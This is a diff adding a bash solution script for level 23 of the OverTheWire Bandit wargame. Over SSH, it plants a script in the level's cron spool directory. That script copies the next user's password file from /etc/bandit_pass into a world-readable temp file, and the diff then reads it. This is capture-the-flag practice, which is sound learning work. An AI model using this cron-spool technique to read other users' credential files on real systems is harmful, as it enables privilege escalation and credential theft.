@@ -1,0 +1,9 @@
+#!/bin/bash
+
+sshpass -p $(cat 22.pass) ssh -q -o StrictHostKeyChecking=no -p 2220 bandit23@bandit.labs.overthewire.org "rm -r /tmp/neubaner-23; mkdir /tmp/neubaner-23; cd /tmp/neubaner-23; echo \"cat /etc/bandit_pass/bandit24 > /tmp/neubaner-23/pass\" > show_pass; chmod 777 show_pass; touch pass; chmod 666 pass; cp show_pass /var/spool/bandit24/show_pass"
+
+# Sleeping on bandit's server does not work, so we sleep on our side and try to get the password later.
+# The cronjob execute every minute.
+sleep 1m;
+
+sshpass -p $(cat 22.pass) ssh -q -o StrictHostKeyChecking=no -p 2220 bandit23@bandit.labs.overthewire.org "cat /tmp/neubaner-23/pass"
